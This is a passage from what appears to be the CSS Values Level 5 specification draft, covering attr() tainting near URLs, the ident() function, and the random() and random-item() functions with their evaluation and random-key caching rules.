>
>   --foo: attr(foo); background-image(src(var(--foo))) (assuming that --foo is a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with string syntax) - can’t launder the value thru another property, either.
>
> <a id="ref-for-funcdef-attr①⑥"></a>
>
> However, using [attr()](#funcdef-attr) for other purposes is fine, even if the usage is <em>near</em> a url:
>
> - <a id="ref-for-propdef-background-image③"></a>
>
>   <a id="ref-for-funcdef-attr①⑦"></a>
>
>   <a id="ref-for-url-value⑤"></a>
>
>   <a id="ref-for-attr-taint④"></a>
>
>   [background-image: image("foo.jpg", attr(bgcolor type(\<color\>)))](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) is fine; the [attr()](#funcdef-attr) is providing a fallback color, and the [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) isn’t [attr()-tainted](#attr-taint).
>
> <a id="ref-for-funcdef-attr①⑧"></a>
>
> <a id="ref-for-custom-property③"></a>
>
> <a id="ref-for-attr-taint⑤"></a>
>
> Using [attr()](#funcdef-attr) indirectly via a [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) causes [attr()-tainting](#attr-taint) of the whole custom property value:
>
> - <a id="ref-for-invalid-at-computed-value-time④"></a>
>
>   --foo: image("foo.jpg", attr(bgcolor type(\<color\>))); background-image: var(--foo); is [invalid at computed-value time](#invalid-at-computed-value-time).
>
>   > <strong data-conversion-semantic="issue">Issue</strong>
>   >
>   > <a id="issue-36b2e6b3"></a> Investigate partial tainting of custom property values.

<a id="ref-for-funcdef-attr①⑨"></a>

<a id="ref-for-registered-custom-property④"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Implementing this restriction requires tracking a dirty bit on values constructed from [attr()](#funcdef-attr) values, since they can be fully resolved into a string via [registered custom properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), so you can’t rely on just examining the value expression. Note that non-string types can even trigger this, via functions like string() that can stringify other types of values: --foo: attr(foo type(\<number\>)); background-image: src(string(var(--foo))) needs to be invalid as well.

<a id="ref-for-identifier-value②"></a>

<a id="ref-for-funcdef-ident"></a>

### <a id="ident"></a>8.8.  Constructing [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) values: the [ident()](#funcdef-ident) function

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/ident-function-computed.html`
- `css/css-values/ident-function-parsing.html`
- `css/css-values/ident-function-substitution.html`

<a id="ref-for-typedef-ident③"></a>

<a id="ref-for-arbitrary-substitution-function⑤"></a>

The <a id="funcdef-ident"></a>ident() function represents an arbitrary [\<ident\>](https://drafts.csswg.org/css-values-4/#typedef-ident), built from one or more separate idents, strings, and integers. It is an [arbitrary substitution function](#arbitrary-substitution-function).

<a id="ref-for-funcdef-ident①"></a>

<a id="ref-for-typedef-ident-arg"></a>

<a id="ref-for-mult-one-plus"></a>

<a id="typedef-ident-arg"></a>

<a id="ref-for-typedef-ident-arg①"></a>

<a id="ref-for-string-value⑨"></a>

<a id="ref-for-comb-one①⓪④"></a>

<a id="ref-for-integer-value"></a>

<a id="ref-for-comb-one①⓪⑤"></a>

<a id="ref-for-typedef-ident④"></a>

```text
<ident()> = ident( <ident-arg>+ )
<ident-arg> = <string> | <integer> | <ident>
```
<a id="ref-for-funcdef-ident②"></a>

<a id="ref-for-argument-grammar③"></a>

The [ident()](#funcdef-ident) function’s [argument grammar](#argument-grammar) is:

<a id="typedef-ident-args"></a>

<a id="ref-for-typedef-ident-args"></a>

<a id="ref-for-typedef-declaration-value②⑨"></a>

```text
<ident-args> = ident( <declaration-value> )
```
<a id="ref-for-funcdef-ident③"></a>

<a id="ref-for-css-css-identifier②"></a>

<a id="ref-for-identifier-value③"></a>

<a id="ref-for-typedef-dashed-ident"></a>

[ident()](#funcdef-ident) can be used anywhere that an [identifier](https://drafts.csswg.org/css-values-4/#css-css-identifier) is expected, but it’s most useful to construct [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) or [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) values.

<a id="ref-for-propdef-view-timeline-name"></a>

<a id="ref-for-funcdef-sibling-index"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-9a12e9c5"></a> In the following example, each matched element gets a unique [view-timeline-name](https://drafts.csswg.org/scroll-animations-1/#propdef-view-timeline-name) by combining a shared prefix with [sibling-index()](#funcdef-sibling-index) to differentiate each element:
>
> ```css
> .item {
>   /* vtl-1, vtl-2, vtl-3, … */
>   view-timeline-name: ident("vtl-" sibling-index());
> }
> ```
<a id="ref-for-funcdef-attr②⓪"></a>

<a id="ref-for-typedef-attr-type⑥"></a>

<a id="ref-for-identifier-value④"></a>

<a id="ref-for-funcdef-ident④"></a>

<a id="ref-for-custom-property④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-d46a7707"></a> While in many cases [attr()](#funcdef-attr) with the [\<attr-type\>](#typedef-attr-type) set to [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) will do, [ident()](#funcdef-ident) can be used to construct a <a id="ref-for-identifier-value⑤"></a>\<custom-ident\> using values that come from other elements. In the following example, the <a id="ref-for-funcdef-ident⑤"></a>ident() function combines a [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) defined on a parent with an <a id="ref-for-funcdef-attr②①"></a>attr() value coming from the element itself:
>
> ```css
> .card[id] {
>   /* E.g. card1, card2, card3, … */
>   --id: attr(id);
> 
>   view-transition-name: ident(var(--id));
>   view-transition-class: card;
> 
>   h1 {
>     /* E.g. card1-title, card2-title, card3-title, … */
>     view-transition-name: ident(var(--id) "-title");
>     view-transition-class: card-title;
>   }
> }
> ```
<a id="ref-for-typedef-dashed-ident①"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-f9589b2a"></a> To generate a [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident), simply use a -- ident as the first segment:
>
> ```css
> .element {
>   anchor-name: ident(-- attr(id));
> }
> ```
<a id="ref-for-replace-an-arbitrary-substitution-function③"></a>

To <a id="replace-an-ident-function"></a>[replace an ident() function](#replace-an-arbitrary-substitution-function), given a list of <var>arguments</var>:

1.  Let <var>arg</var> be the first item of <var>arguments</var>.

    <a id="ref-for-funcdef-ident⑥"></a>

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: [ident()](#funcdef-ident) only takes a single argument.

2.  <a id="ref-for-substitute-arbitrary-substitution-function⑨"></a>

    <a id="ref-for-css-parse-something-according-to-a-css-grammar⑨"></a>

    <a id="ref-for-typedef-ident-arg②"></a>

    <a id="ref-for-guaranteed-invalid-value⑧"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>arg</var>, then [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as [\<ident-arg\>](#typedef-ident-arg)+. If that returns failure, return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value). Otherwise, let <var>pieces</var> be the result.

3.  <a id="ref-for-computed-value①③"></a>

    <a id="ref-for-string①"></a>

    <a id="ref-for-integer"></a>

    <a id="ref-for-css-css-identifier③"></a>

    <a id="ref-for-guaranteed-invalid-value⑨"></a>

    Replace each item in <var>pieces</var> with its [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value). If any item does not, at this point, become a [string](https://infra.spec.whatwg.org/#string), [integer](https://drafts.csswg.org/css-values-4/#integer), or [ident](https://drafts.csswg.org/css-values-4/#css-css-identifier), return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

    <a id="ref-for-computed-value①④"></a>

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: For example, if the value is a function that can’t resolve at [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time.

4.  <a id="ref-for-string-concatenate"></a>

    <a id="ref-for-css-css-identifier④"></a>

    <a id="ref-for-guaranteed-invalid-value①⓪"></a>

    Serialize each item in <var>pieces</var>, then [concatenate](https://infra.spec.whatwg.org/#string-concatenate) the list. Return an [ident](https://drafts.csswg.org/css-values-4/#css-css-identifier) whose value is the result. If the result can’t be represented as an <a id="ref-for-css-css-identifier⑤"></a>ident (for example, the empty string), instead return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

## <a id="randomness"></a>9.  Generating Random Values

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/random-in-keyframe.html`

It is often useful to incorporate some degree of "randomness" to a design, either to make repeated elements on a page feel less static and identical, or just to add a bit of "flair" to a page without being distracting.

<a id="ref-for-funcdef-random"></a>

<a id="ref-for-funcdef-random-item①"></a>

The [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions (the <a id="css-random-function"></a>random functions) allow authors to incorporate randomness into their page, while keeping this randomness predictable from a design perspective, letting authors decide whether a random value should be reused in several places or be unique between instances.

<a id="ref-for-css-random-function"></a>

The exact random-number generation method is UA-defined. It <em>should</em> be the case that two distinct random values have no easily-detectable correlation, but this specification intentionally does not specify what that means in terms of cryptographic strength. Authors <em>must not</em> rely on [random functions](#css-random-function) for any purposes that depend on quality cryptography.

<a id="ref-for-funcdef-random①"></a>

### <a id="random"></a>9.1.  Generating a Random Numeric Value: the [random()](#funcdef-random) function

<a id="ref-for-math-function⑤"></a>

The <a id="funcdef-random"></a>random() function is a [math function](https://drafts.csswg.org/css-values-4/#math-function) that represents a random value between a minimum and maximum value, drawn from a uniform distribution, optionally limiting the possible values to a step between those limits:

<a id="ref-for-typedef-random-key①"></a>

<a id="ref-for-mult-opt④②"></a>

<a id="ref-for-comb-comma②⑤"></a>

<a id="ref-for-typedef-calc-sum①③"></a>

<a id="ref-for-comb-comma②⑥"></a>

<a id="ref-for-typedef-calc-sum①④"></a>

<a id="ref-for-comb-comma②⑦"></a>

<a id="ref-for-typedef-calc-sum①⑤"></a>

<a id="ref-for-mult-opt④③"></a>

```text
<random()> = random( <random-key>? , <calc-sum>, <calc-sum>, <calc-sum>? )
```
> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-48ec89a1"></a> Imagine you have several .box elements, all styled with the following CSS:
>
> ```text
> .box {
>   width: random(???, 100px, 200px);
>   height: random(???, 100px, 200px);
>   border: thin solid;
> }
> ```
>
> <a id="ref-for-typedef-random-key②"></a>
>
> Depending on what [\<random-key\>](#typedef-random-key) you provide in place of the ???, you’ll get significantly different behavior for the elements:
>
> <a id="ref-for-valdef-random-auto"></a>
>
> [auto](#valdef-random-auto)/omitted, <b>maximum random</b>: <b></b><b></b><b></b><b></b>
>
> Each property gets a different value, and it’s different per element too, so you get a bunch of <strong>different</strong> random <strong>rectangles</strong>.
>
> --foo, <b>shared by name</b>: <b></b><b></b><b></b><b></b>
>
> Both properties use the same value, and every element shares that value, so you get a bunch of <strong>identical</strong> random <strong>squares</strong>.
>
> <a id="ref-for-valdef-random-element-scoped"></a>
>
> [element-scoped](#valdef-random-element-scoped), <b>scoped per element</b>: <b></b><b></b><b></b><b></b>
>
> Both properties use the same value, but each element gets a different value, so you get a bunch of <strong>different</strong> random <strong>squares</strong>.
>
> <a id="ref-for-valdef-random-property-scoped"></a>
>
> [property-scoped](#valdef-random-property-scoped), <b>scoped per property</b>: <b></b><b></b><b></b><b></b>
>
> Each property gets a different value, but each element shares that value, so you get a bunch of <strong>identical</strong> random <strong>rectangles</strong>.

See [§ 9.3 Evaluating Random Values](#random-evaluation) and [§ 9.4 Sharing (Or Not) Random Values: the \<random-key\> value](#random-caching) for details on how the function is evaluated. Its arguments are:

<a id="ref-for-typedef-random-key③"></a>

[\<random-key\>](#typedef-random-key)

<a id="ref-for-typedef-random-key④"></a>

<a id="ref-for-css-random-function①"></a>

<a id="ref-for-random-base-value"></a>

<a id="ref-for-valdef-random-auto①"></a>

The optional [\<random-key\>](#typedef-random-key) controls which [random functions](#css-random-function) in the document will share a [random base value](#random-base-value) and which will get distinct values. If <a id="ref-for-typedef-random-key⑤"></a>\<random-key\> is omitted, it behaves as [auto](#valdef-random-auto).

See [§ 9.4 Sharing (Or Not) Random Values: the \<random-key\> value](#random-caching) for a full description of this value.

<a id="ref-for-typedef-calc-sum①⑥"></a>

[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum), <a id="ref-for-typedef-calc-sum①⑦"></a>\<calc-sum\>

<a id="ref-for-calc-calculation②"></a>

The two required [calculations](https://drafts.csswg.org/css-values-4/#calc-calculation) specify the minimum and maximum value the function can resolve to. Both limits are inclusive (the result can be the min or the max).

If the maximum value is less than the minimum value, it behaves as if it’s equal to the minimum value.

<a id="ref-for-length-value⑨"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-84ddc1e3"></a> For example, random(100px, 300px) will resolve to a random [\<length\>](https://drafts.csswg.org/css-values-4/#length-value) between 100px and 300px: it might be 100px, 300px, or any value between them like 234.5px.

<a id="ref-for-typedef-calc-sum①⑧"></a>

[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum)?

The final optional argument specifies a step value: the values the function can resolve to are further restricted to the form `min + (N * step)`, where N is a non-negative integer chosen uniformly randomly from the possible values that result in an in-range value.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-e07293f3"></a> For example, random(100px, 300px, 50px) can only resolve to 100px, 150px, 200px, 250px, or 300px; it will never return a value like 120px.
>
> Note that the max value might not actually show up as a possible value; for example, in random(100px, 200px, 30px), the possible values are 100px, 130px, 160px, and 190px.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Even if it’s <em>intended</em> that `min` and `max` are exactly some integer multiple of `step` apart, numeric precision issues can prevent that from being true. To avoid these issues, if the max value is <em>very close</em> to equalling a stepped value (above or below it), the max value is used as the final stepped value instead. See [§ 9.3 Evaluating Random Values](#random-evaluation) for precise details.

<a id="ref-for-funcdef-round"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-28cc10b2"></a> As explained in the definition of [round()](https://drafts.csswg.org/css-values-4/#funcdef-round), CSS has no "natural" precision for values, but the step value can be used to assign one.
>
> For example, random(100px, 500px, 1px) restricts it to resolving only to whole px values; random(1, 10, 1) is restricted to resolving only to integers; etc.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Providing a step value <em>is not equivalent</em> to generating a random value and then rounding it; random(100px, 200px, 50px) will generate three possible values (100px, 150px, 200px) all with a 1/3 chance, while round(random(100px, 200px), 50px) will generate the same three possible values, but 150px will occur 1/2 the time, while 100px and 200px will only occur 1/4 of the time each.

<a id="ref-for-calc-calculation③"></a>

<a id="ref-for-css-consistent-type⑦"></a>

All of the [calculation](https://drafts.csswg.org/css-values-4/#calc-calculation) arguments can resolve to any value, but must have a [consistent type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid; the result’s type will be the consistent type.

<a id="ref-for-length-value①⓪"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-ff333f2e"></a> For example, random(50px, 100%, 1em) is valid (assuming percentages are valid in the context this is used, and resolve to a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value)), as all three arguments resolve to a length.
>
> However, random(50px, 180deg) is invalid, as lengths and angles are not the same type.

#### <a id="random-infinities"></a>9.1.1.  Argument Ranges

In random(A, B), if A is infinite, the result is infinite.

If A is finite, but the difference between A and B is either infinite or large enough to be treated as infinite in the user agent, the result is NaN.

In random(A, B, C), the same behavior for A and B as defined above applies.

If C is infinite, the result is A.

If C is negative, zero, or positive but close enough to zero that the range for the step multiplier (the `N` mentioned in [§ 9.3 Evaluating Random Values](#random-evaluation)) would be infinite in the user agent, the step must be <em>ignored</em>. (The function is treated as if only A and B were provided.)

<a id="ref-for-math-function⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: As usual for [math functions](https://drafts.csswg.org/css-values-4/#math-function), if any argument calculation is NaN, the result is NaN.

<a id="ref-for-funcdef-random-item②"></a>

### <a id="random-item"></a>9.2.  Picking a Random Item From a List: the [random-item()](#funcdef-random-item) function

The <a id="funcdef-random-item"></a>random-item() function resolves to a random item from among its list of items.

<a id="ref-for-typedef-random-key⑥"></a>

<a id="ref-for-comb-comma②⑧"></a>

<a id="ref-for-typedef-declaration-value③⓪"></a>

<a id="ref-for-mult-opt④④"></a>

<a id="ref-for-mult-comma①①"></a>

```text
<random-item()> = random-item( <random-key> , [ <declaration-value>? ]# )
```
<a id="ref-for-funcdef-random-item③"></a>

<a id="ref-for-argument-grammar④"></a>

The [random-item()](#funcdef-random-item) function’s [argument grammar](#argument-grammar) is:

<a id="typedef-random-item-args"></a>

<a id="ref-for-typedef-random-item-args"></a>

<a id="ref-for-typedef-declaration-value③①"></a>

<a id="ref-for-comb-comma②⑨"></a>

<a id="ref-for-typedef-declaration-value③②"></a>

<a id="ref-for-mult-opt④⑤"></a>

<a id="ref-for-mult-comma①②"></a>

```text
<random-item-args> = random-item( <declaration-value>, [ <declaration-value>? ]# )
```
See [§ 9.3 Evaluating Random Values](#random-evaluation) and [§ 9.4 Sharing (Or Not) Random Values: the \<random-key\> value](#random-caching) for details on how the function is evaluated.

<a id="ref-for-typedef-random-key⑦"></a>

<a id="ref-for-funcdef-random②"></a>

The <em>required</em> [\<random-key\>](#typedef-random-key) is interpreted identically to [random()](#funcdef-random). (See [§ 9.4 Sharing (Or Not) Random Values: the \<random-key\> value](#random-caching) for details.)

<a id="ref-for-typedef-random-key⑧"></a>

<a id="ref-for-funcdef-random-item④"></a>

<a id="ref-for-funcdef-random③"></a>

<a id="ref-for-typedef-declaration-value③③"></a>

<a id="ref-for-typedef-random-cache-key"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [\<random-key\>](#typedef-random-key) argument is required in [random-item()](#funcdef-random-item), but optional in [random()](#funcdef-random), for parsing reasons (it’s impossible to tell whether random-item(--foo, --bar, --baz) has three [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) arguments or two and a [\<random-cache-key\>](#typedef-random-cache-key)).

<a id="ref-for-funcdef-random-item⑤"></a>

The remaining arguments are arbitrary sequences of CSS values. The [random-item()](#funcdef-random-item) function is substituted with one of these sequences, chosen uniformly at random.

<a id="ref-for-funcdef-random-item⑥"></a>

<a id="ref-for-arbitrary-substitution-function⑥"></a>

<a id="ref-for-funcdef-var①⓪"></a>

The [random-item()](#funcdef-random-item) function is an [arbitrary substitution function](#arbitrary-substitution-function), like [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var).

<a id="ref-for-funcdef-random-item⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> That is, if you use [random-item()](#funcdef-random-item):
>
> - <a id="ref-for-funcdef-random-item⑧"></a>
>
>   <a id="ref-for-arbitrary-substitution-function⑦"></a>
>
>   So long as [random-item()](#funcdef-random-item) itself (and any other [arbitrary substitution functions](#arbitrary-substitution-function)) is syntactically valid, the entire property is assumed to be valid at parse time.
>
> - <a id="ref-for-funcdef-random-item⑨"></a>
>
>   <a id="ref-for-computed-value①⑤"></a>
>
>   <a id="ref-for-substitute-a-var"></a>
>
>   [random-item()](#funcdef-random-item) is substituted with whatever value it resolves to at [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time when you’d [substitute a var()](https://www.w3.org/TR/css-variables-1/#substitute-a-var), so children all inherit the same resolved value.
>
> - <a id="ref-for-guaranteed-invalid-value①①"></a>
>
>   If the substituted value ends up making the property invalid, the property’s value becomes the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

<a id="ref-for-replace-an-arbitrary-substitution-function④"></a>

To <a id="replace-a-random-item-function"></a>[replace a random-item() function](#replace-an-arbitrary-substitution-function), given a list of <var>arguments</var>:

1.  <a id="ref-for-typedef-declaration-value③④"></a>

    Let <var>value sharing</var> be the first [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) in <var>arguments</var>, and <var>options</var> be a list of the remaining <a id="ref-for-typedef-declaration-value③⑤"></a>\<declaration-value\>? options.

2.  <a id="ref-for-substitute-arbitrary-substitution-function①⓪"></a>

    <a id="ref-for-css-parse-something-according-to-a-css-grammar①⓪"></a>

    <a id="ref-for-typedef-random-key⑨"></a>

    <a id="ref-for-guaranteed-invalid-value①②"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>value sharing</var>, then [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as [\<random-key\>](#typedef-random-key). If parsing returns failure, return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value); otherwise set <var>value sharing</var> to the result.

3.  Select one of the <var>options</var>, as specified in [§ 9.3 Evaluating Random Values](#random-evaluation), using <var>value sharing</var> as specified in [§ 9.4 Sharing (Or Not) Random Values: the \<random-key\> value](#random-caching), and let <var>chosen option</var> be the result.

4.  <a id="ref-for-substitute-arbitrary-substitution-function①①"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>chosen option</var>, then return the result.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/random-item-computed.html`
- `css/css-values/random-item-in-keyframe.html`
- `css/css-values/random-item-invalid.html`
- `css/css-values/random-item-nested.html`
- `css/css-values/random-item-serialize.html`
- `css/css-values/random-item-unresolvable-argument.html`
- `css/css-values/random-item-valid.html`
- `css/css-values/tree-counting/trig-functions-in-gradient-position.html`

### <a id="random-evaluation"></a>9.3.  Evaluating Random Values

<a id="ref-for-css-random-function②"></a>

<a id="ref-for-random-base-value①"></a>

Given a [random function](#css-random-function) with a [random base value](#random-base-value) <var>R</var>, the value of the function is:

<a id="ref-for-funcdef-random④"></a>

for a [random()](#funcdef-random) function with <var>min</var> and <var>max</var>, but no step

Return <code><var>min</var> + <var>R</var> &#x2A; <c->(</c-><var>max</var> - <var>min</var><c->)</c-></code>

<a id="ref-for-funcdef-random⑤"></a>

for a [random()](#funcdef-random) function with <var>min</var>, <var>max</var>, and <var>step</var>

- Let <var>epsilon</var> be <code><var>step</var> / <c->1000</c-></code>, or the smallest representable value greater than zero in the numeric type being used if <var>epsilon</var> would round to zero.

- Let <var>N</var> be the largest integer such that <code><var>min</var> + <var>N</var> &#x2A; <var>step</var></code> is less than or equal to <var>max</var>.

  If <var>N</var> produces a value that is not within <var>epsilon</var> of <var>max</var>, but <var>N</var>+1 would produce a value within <var>epsilon</var> of <var>max</var>, set <var>N</var> to <var>N</var>+1.

- <a id="ref-for-generate-a-random-integer"></a>

  Let <var>step index</var> be a [random integer](#generate-a-random-integer) less than <var>N</var>+1, given <var>R</var>.

- Let <var>value</var> be <code><var>min</var> + <var>step index</var> &#x2A; <var>step</var></code>.

- If <var>step index</var> is <var>N</var> and <var>value</var> is within <var>epsilon</var> of <var>max</var>, return <var>max</var>.

- Otherwise, return <var>value</var>.

> <strong data-conversion-semantic="note">Note</strong>
>
> Epsilon/max Details
>
> <var>epsilon</var> was chosen to be <code><var>step</var> / <c->1000</c-></code> as a useful "middle ground" value: small enough that it’s very unlikely to accidentally trigger when the author didn’t intend it, but large enough that it’s guaranteed to catch floating-point precision errors.
>
> It’s size is also within the realm for authors to exploit themselves; if their <var>max</var> is meant to be an integer multiple of their <var>step</var>, but the <var>step</var> is not a terminating decimal, as long as they write the <var>step</var> with 5 or 6 digits of precision then the largest value should land within <var>epsilon</var> of <var>max</var>.
>
> For example, while random(0px, 100px, 33.3px) will not generate a 100px value (the epsilon is .0333px, but 3 steps yields 99.9px, which is .1px from <var>max</var>, more than the epsilon), random(0px, 100px, 33.333px) will (the epsilon is .033333px, similar to the previous example, but 3 steps yields 99.999px, which is .001px from <var>max</var>, much less than the epsilon). (A sufficiently large number of steps could still cause enough divergence to defeat this, but it works for any remotely reasonable use-case.)
>
> <a id="ref-for-calc-calculation④"></a>
>
> Using a [calculation](https://drafts.csswg.org/css-values-4/#calc-calculation) to "exactly" represent non-terminating decimals will also work, of course: random(0px, 100px, 100px / 3) is guaranteed to be able to generate a 100px value, as the step value will only be subject to floating-point precision errors far smaller than the epsilon.

<a id="ref-for-typedef-declaration-value③⑥"></a>

<a id="ref-for-funcdef-random-item①⓪"></a>

for a [random-item()](#funcdef-random-item) function with <var>N</var> [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)? arguments:

- <a id="ref-for-generate-a-random-integer①"></a>

  Let <var>index</var> be a [random integer](#generate-a-random-integer) less than <var>N</var>, given <var>R</var>.

- Return the <var>index</var>’th argument (0-indexed).

<a id="ref-for-random-base-value②"></a>

To <a id="generate-a-random-integer"></a>generate a random integer less than some integer <var>limit</var> given a [random base value](#random-base-value) <var>R</var>, return round(down, <var>R</var> \* <var>limit</var>, 1)

<a id="ref-for-typedef-random-key①⓪"></a>

### <a id="random-caching"></a>9.4.  Sharing (Or Not) Random Values: the [\<random-key\>](#typedef-random-key) value

CSS is a declarative language, so functions don’t have a specific “time” when they’re evaluated; the user agent is free to “execute” functions in any order, as many times as they want, as every execution will return the same value. This is difficult to square with random-value functions, which are inherently <em>stateful</em> and care about when, how often, and in what order they’re executed.

<a id="ref-for-css-random-function③"></a>

<a id="ref-for-random-cache-name"></a>

<a id="ref-for-random-base-value③"></a>

To solve this, the [random functions](#css-random-function) are associated with a [random cache name](#random-cache-name), ensuring that any time the random function is evaluated with the same cache key, it will return the same [random base value](#random-base-value); and also that <a id="ref-for-css-random-function④"></a>random functions with <em>different</em> caching keys will return <em>different</em> <a id="ref-for-random-base-value④"></a>random base value from each other (unless they are, randomly, the same).

<a id="ref-for-typedef-random-key①①"></a>

<a id="ref-for-valdef-random-auto②"></a>

The [\<random-key\>](#typedef-random-key) value controls this behavior, and defaults to [auto](#valdef-random-auto) when omitted. It’s syntax is as follows, and interpreted as described below:

<a id="typedef-random-key"></a>

<a id="ref-for-typedef-random-key①②"></a>

<a id="ref-for-comb-one①⓪⑥"></a>

<a id="ref-for-typedef-random-cache-key①"></a>

<a id="ref-for-comb-one①⓪⑦"></a>

<a id="ref-for-number-value①③"></a>

<a id="typedef-random-cache-key"></a>

<a id="ref-for-typedef-random-cache-key②"></a>

<a id="ref-for-typedef-dashed-ident②"></a>

<a id="ref-for-comb-any②"></a>

<a id="ref-for-comb-any③"></a>

<a id="ref-for-comb-one①⓪⑧"></a>

<a id="ref-for-comb-one①⓪⑨"></a>

<a id="ref-for-typedef-random-ua-ident"></a>

<a id="typedef-random-ua-ident"></a>

<a id="ref-for-typedef-random-ua-ident①"></a>

<a id="ref-for-identifier-value⑥"></a>

```text
<random-key> = auto | <random-cache-key> | fixed <number [0,1]>
<random-cache-key> =  <dashed-ident> || element-scoped
                       || [ property-scoped | property-index-scoped | <random-ua-ident> ]
<random-ua-ident> = <custom-ident>
```
<a id="valdef-random-auto"></a>auto

<a id="ref-for-css-random-function⑤"></a>

<a id="ref-for-random-cache-name①"></a>

<a id="ref-for-funcdef-random⑥"></a>

The [random function](#css-random-function) is roughly “as random as possible”: the [random cache name](#random-cache-name), and thus the result, varies across every [random()](#funcdef-random) instance in a multi-component value, across different properties, and across different elements.

This is equivalent to specifying element-scoped property-index-scoped, and simplifies in exactly the same way.

<a id="ref-for-typedef-random-cache-key③"></a>

<a id="valdef-random-random-cache-key"></a>[\<random-cache-key\>](#typedef-random-cache-key)

<a id="ref-for-typedef-random-cache-key④"></a>

<a id="ref-for-random-cache-name②"></a>

<a id="ref-for-css-random-function⑥"></a>

The [\<random-cache-key\>](#typedef-random-cache-key) specifies the [random cache name](#random-cache-name), allowing it to be explicitly shared (or not) with other uses of [random functions](#css-random-function). Every <a id="ref-for-css-random-function⑦"></a>random function using the same <a id="ref-for-random-cache-name③"></a>random cache name will get the same random value; every one using a <em>different</em> <a id="ref-for-random-cache-name④"></a>random cache name will get unrelated random values.

- <a id="ref-for-typedef-dashed-ident③"></a>

  The [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) gives the value an explicit name. If omitted, this part of the name is null.

- <a id="ref-for-random-cache-name⑤"></a>

  <a id="valdef-random-element-scoped"></a>element-scoped adds an element-specific identifier to the [random cache name](#random-cache-name), so different elements will get different random values.

  <a id="ref-for-css-random-function⑧"></a>

  <a id="ref-for-custom-function"></a>

  <a id="ref-for-valdef-random-element-scoped①"></a>

  If the [random function](#css-random-function) is being evaluated inside of a [custom function](https://drafts.csswg.org/css-mixins-1/#custom-function), the element-specific identifier is for the "hypothetical element" that the function’s styles are evaluated on, so [element-scoped](#valdef-random-element-scoped) will give you different random values on every function invocation.

- <a id="ref-for-shorthand-property②"></a>

  <a id="ref-for-random-cache-name⑥"></a>

  <a id="ref-for-css-random-function⑨"></a>

  <a id="valdef-random-property-scoped"></a>property-scoped adds the property name the [random function](#css-random-function) is being used on to the [random cache name](#random-cache-name), so different properties will get different random values. Note that shorthand declarations will apply the [shorthand property](https://drafts.csswg.org/css-cascade-5/#shorthand-property)’s name.

- <a id="ref-for-shorthand-property③"></a>

  <a id="ref-for-css-random-function①⓪"></a>

  <a id="ref-for-random-cache-name⑦"></a>

  <a id="valdef-random-property-index-scoped"></a>property-index-scoped adds the property name <em>and</em> the index of the random function among all the random functions used in the same property value to the [random cache name](#random-cache-name), so multiple instances of a [random function](#css-random-function) in the same declaration will each get different <a id="ref-for-random-cache-name⑧"></a>random cache names. Note this index is assigned <em>before</em> [shorthand](https://drafts.csswg.org/css-cascade-5/#shorthand-property) expansion.

See [§ 9.4.1 Simplification of \<random-key\>](#random-simplify) for how these values resolve.

<a id="ref-for-typedef-random-ua-ident②"></a>

<a id="ref-for-valdef-random-fixed"></a>

<a id="ref-for-computed-value①⑥"></a>

